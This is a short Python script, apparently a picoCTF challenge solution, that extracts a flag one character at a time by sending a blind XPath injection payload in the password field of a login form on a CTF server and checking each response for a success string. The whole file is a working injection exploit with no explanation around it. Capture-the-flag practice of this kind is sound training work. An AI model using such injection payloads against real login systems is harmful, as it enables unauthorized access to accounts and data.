import string
import requests

printables = [*string.ascii_letters, *string.digits, "_", "{", "}"]
url = "http://mercury.picoctf.net:7029/"
password = "picoCTF{h0p3fully_u_t0ok_th"


while True:
    for i in printables:
        print('Trying: ' + password + i)
        data = {"name": "admin", "pass": f"' or //*[starts-with(text(),'" + password + i + "')] or '1'='"}
        r = requests.post(url, data=data)
        if "on the right path." in str(r.text):
            password += i
            print('Got: ' + password)
            break
